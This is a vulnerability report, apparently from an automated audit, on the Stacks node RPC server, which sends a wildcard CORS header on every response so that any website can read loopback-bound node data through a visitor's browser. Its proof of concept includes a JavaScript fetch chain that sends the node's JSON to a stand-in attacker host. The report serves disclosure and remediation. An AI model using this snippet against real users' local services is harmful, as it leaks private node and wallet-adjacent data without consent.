### Title
Stacks node RPC server unconditionally sets `Access-Control-Allow-Origin: *` on every HTTP response, allowing any website to bypass same-origin protections and read node RPC data via a victim's browser - ([File: stackslib/src/net/http/response.rs])

### Summary
Every HTTP response emitted by the Stacks node's RPC server unconditionally injects `Access-Control-Allow-Origin: *` (plus permissive `Access-Control-Allow-Headers`/`Methods`) into the preamble during serialization, with no configuration option to disable it. This is the exact bug class in the esbuild advisory: a locally-bound development/RPC server sets a wildcard CORS header on all responses (including those an operator would expect to be protected by the browser's same-origin policy because the service is bound to `127.0.0.1` or a private interface), letting any malicious webpage visited by the operator issue cross-origin `fetch()` requests to the node and read the JSON response.

### Finding Description
`HttpResponsePreamble::consensus_serialize` in `stackslib/src/net/http/response.rs` always writes the CORS headers unless the caller has already set them: [1](#0-0) 

This happens for *every* response the RPC server ("stacks-node" `/v2/*`, `/v3/*` endpoints) sends, and there is no `add_header`/config path that lets an operator remove or narrow it — `remove_header` explicitly refuses to remove reserved headers, and `access-control-allow-origin` is treated as a normal (non-reserved) header that gets defaulted in if absent, so operators cannot turn this off without patching the code. A second helper, `add_CORS_headers`, independently inserts the same wildcard header: [2](#0-1) 

Because the wildcard applies to *simple* cross-origin requests (GET with no custom headers), any unauthenticated read-only RPC endpoint (e.g., account state, mempool contents, chain tip, block/microblock data) becomes readable by an attacker-controlled webpage through the *victim's browser*, even when the node's RPC interface is bound to `127.0.0.1` or a private LAN address specifically so that only local processes/users can reach it. This lets a malicious website perform a browser-mediated SSRF-like read against services the operator assumed were protected by network binding and the browser's same-origin policy — precisely the CWE-346 origin-validation error described in the esbuild advisory (`Access-Control-Allow-Origin: *` on every response of a locally-bound service, enabling any site to read cross-origin responses).

Note: routes gated with a custom `authorization` header (e.g. block-proposal, block-replay endpoints) are not directly exposable this way, because `Access-Control-Allow-Headers` does not include `authorization`, so a cross-origin request adding that header would fail CORS preflight. The exposure is therefore scoped to unauthenticated/public GET endpoints that don't require custom headers, but this still discloses node/wallet-adjacent state (mempool visibility, account balances, chain tip) to any third-party website via the operator's browser, which is exactly the confidentiality break the advisory flags.

### Impact Explanation
An attacker-controlled website can silently exfiltrate data from a Stacks node's RPC interface through a visiting operator's browser, even when that RPC interface is intentionally bound to a private/loopback address to keep it off the public internet. This is an unauthorized read of node state that the operator believed was protected by network isolation plus the browser's same-origin policy — a confidentiality/information-disclosure impact reached remotely with no privileges and only requiring the victim to load a malicious page while their node is running.

### Likelihood Explanation
Likelihood is moderate: it requires the victim (node operator or any user with a browser on the same machine/network as the node) to visit an attacker-controlled page while the RPC server is reachable from that browser (loopback fetches from a page are permitted by browsers). No credentials, DNS rebinding, or special network position are needed beyond normal browser same-origin bypass via the wildcard header, which is always present since the header is added unconditionally by the codec with no opt-out.

### Recommendation
Do not unconditionally set `Access-Control-Allow-Origin: *` on every RPC response. At minimum:
- Make the CORS headers opt-in/configurable, defaulting to no CORS headers (or reflecting only explicitly allowlisted origins) for the node's RPC interface, matching esbuild's fix (`de85afd`) which stopped defaulting to `*` and required explicit configuration.
- Ensure `access-control-allow-origin`/`access-control-allow-headers`/`access-control-allow-methods` can be removed or restricted per-deployment (e.g., via a config flag) rather than being force-written in `HttpResponsePreamble::consensus_serialize`.

### Proof of Concept
1. Run a `stacks-node` with its RPC interface bound to `127.0.0.1:20443` (a common operator practice to keep the RPC surface off the public internet).
2. Host a malicious page at `http://attacker.example.com` that runs:
   ```js
   fetch('http://127.0.0.1:20443/v2/info')
     .then(r => r.json())
     .then(data => fetch('https://attacker.example.com/exfil', {method:'POST', body: JSON.stringify(data)}));
   ```
3. Have the node operator visit `attacker.example.com` in a browser on the same host/network.
4. Because every response from the node includes `Access-Control-Allow-Origin: *` (per `HttpResponsePreamble::consensus_serialize`, `stackslib/src/net/http/response.rs:397-400`), the browser allows the cross-origin `fetch` to succeed and the JSON body is readable by the attacker's script — despite the RPC port being bound only to loopback.

### Citations

**File:** stackslib/src/net/http/response.rs (L332-335)
```rust
    pub fn add_CORS_headers(&mut self) {
        self.headers
            .insert("Access-Control-Allow-Origin".to_string(), "*".to_string());
    }
```

**File:** stackslib/src/net/http/response.rs (L397-410)
```rust
        if !self.headers.contains_key("access-control-allow-origin") {
            fd.write_all("Access-Control-Allow-Origin: *\r\n".as_bytes())
                .map_err(CodecError::WriteError)?;
        }

        if !self.headers.contains_key("access-control-allow-headers") {
            fd.write_all("Access-Control-Allow-Headers: origin, content-type\r\n".as_bytes())
                .map_err(CodecError::WriteError)?;
        }

        if !self.headers.contains_key("access-control-allow-methods") {
            fd.write_all("Access-Control-Allow-Methods: POST, GET, OPTIONS\r\n".as_bytes())
                .map_err(CodecError::WriteError)?;
        }
```
